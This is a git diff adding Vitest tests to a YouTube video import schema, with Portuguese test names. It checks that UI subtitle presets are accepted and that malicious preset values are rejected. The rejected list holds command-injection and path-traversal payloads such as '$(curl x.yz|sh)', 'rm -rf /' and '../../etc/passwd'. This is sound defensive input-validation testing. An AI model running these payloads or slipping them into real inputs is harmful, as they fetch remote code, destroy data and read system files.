@@ -1,6 +1,9 @@
 import { describe, it, expect } from "vitest";
 import { importYouTubeVideoSchema } from "~/domain/schemas/import-youtube-video.schema";
 import { MAX_MANUAL_CUTS } from "~/domain/schemas/manual-cut.schema";
+import { PROJECT_SUBTITLE_PRESETS } from "~/domain/schemas/projects-actions.schema";
+
+const BASE = { url: "https://www.youtube.com/watch?v=dQw4w9WgXcQ" };
 
 describe("importYouTubeVideoSchema", () => {
   it("aceita o payload mínimo válido (apenas url)", () => {
@@ -115,4 +118,17 @@ describe("importYouTubeVideoSchema", () => {
 
     expect(result.success).toBe(true);
   });
+
+  it.each(PROJECT_SUBTITLE_PRESETS)("aceita o preset %s oferecido pela UI", (preset) => {
+    const result = importYouTubeVideoSchema.safeParse({ ...BASE, preset });
+    expect(result.success).toBe(true);
+  });
+
+  it.each(["$(curl x.yz|sh)", "`id`", "HORMOZI; rm -rf /", "../../etc/passwd", "hormozi", "UNKNOWN"])(
+    "rejeita preset fora da allowlist (payload malicioso: %s)",
+    (preset) => {
+      const result = importYouTubeVideoSchema.safeParse({ ...BASE, preset });
+      expect(result.success).toBe(false);
+    },
+  );
 });
